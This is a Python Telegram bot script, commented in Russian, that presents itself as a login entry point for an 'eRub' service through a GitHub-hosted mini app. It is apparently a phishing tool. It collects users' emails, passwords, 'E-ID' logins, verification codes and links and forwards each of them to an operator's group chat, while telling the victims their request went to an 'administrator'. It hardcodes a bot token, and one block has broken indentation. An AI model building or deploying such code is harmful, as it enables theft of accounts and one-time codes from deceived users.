import os
import logging
import json
import requests
import time
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ==================== КОНФИГ ====================
BOT_TOKEN = "8828808036:AAFw0KZn5czy-OqhpwFkZEi8Ja3TcKxkfgE"
GROUP_CHAT_ID = -1004457031723
WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp2/"
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_sessions = {}

class ErubBot:
    def __init__(self):
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    # ===== 1. /start =====
    async def start(self, update: Update, context):
        user = update.effective_user

        await self.app.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=f"🟢 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\nID: `{user.id}`\n@{user.username or 'нет'}",
            parse_mode="Markdown"
        )

await update.message.reply_text(
    f"👋 Привет, {user.first_name}!\n\nНажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.\n\nЕсли Вы ещё не зарегистрированы в eRub, выберите Вход через E-ID.",
    reply_markup=ReplyKeyboardMarkup(
        [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
        resize_keyboard=True
    )
)

    # ===== 2. Обработка всех сообщений =====
    async def handle(self, update: Update, context):
        if not update.message:
            return

        msg = update.message
        chat_id = msg.chat.id
        user_id = msg.from_user.id
        text = msg.text

        # Если сообщение из группы — игнорируем
        if chat_id == GROUP_CHAT_ID:
            return

        # ---- Если пользователь вводит код ----
        if user_sessions.get(user_id, {}).get('awaiting_code'):
            await self.app.bot.send_message(
                GROUP_CHAT_ID,
                f"📧 КОД: `{text}`",
                parse_mode="Markdown"
            )
            user_sessions[user_id]['awaiting_code'] = False
            await msg.reply_text("✅ Код отправлен администратору!")
            return

        # ---- Если пользователь вводит ссылку ----
        if user_sessions.get(user_id, {}).get('awaiting_link'):
            await self.app.bot.send_message(
                GROUP_CHAT_ID,
                f"🔗 ССЫЛКА: `{text}`",
                parse_mode="Markdown"
            )
            user_sessions[user_id]['awaiting_link'] = False
            await msg.reply_text("✅ Ссылка отправлена администратору!")
            return

        # ---- Если это JSON от Mini App ----
        if text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                link = data.get('link')
                eid_type = data.get('type')

                # ---- Обычный вход ----
                if email and password and not code and not link:
                    await self.app.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                             f"👤 ID: `{user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Заявка отправлена администратору!")
                    return

                # ---- E-ID вход ----
                if eid_type == 'eid_login' and email and password:
                    await self.app.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🆔 E-ID ВХОД\n\n"
                             f"👤 ID: `{user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                    return

                # ---- Код ----
                if code:
                    await self.app.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"📧 КОД: `{code}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Код отправлен администратору!")
                    return

                # ---- Ссылка ----
                if link:
                    await self.app.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🔗 ССЫЛКА: `{link}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Ссылка отправлена администратору!")
                    return

            except Exception as e:
                logger.error(f"Ошибка: {e}")

        # ---- Если пользователь просто пишет текст ----
        await msg.reply_text("ℹ️ Используйте кнопку «Войти»")

    # ===== 3. Запуск =====
    def run(self):
        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
            time.sleep(1)
        except:
            pass

        print("=" * 50)
        print("🚀 БОТ ЗАПУЩЕН")
        print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
        print("=" * 50)

        self.app.run_polling()


if __name__ == "__main__":
    bot = ErubBot()
    bot.run()
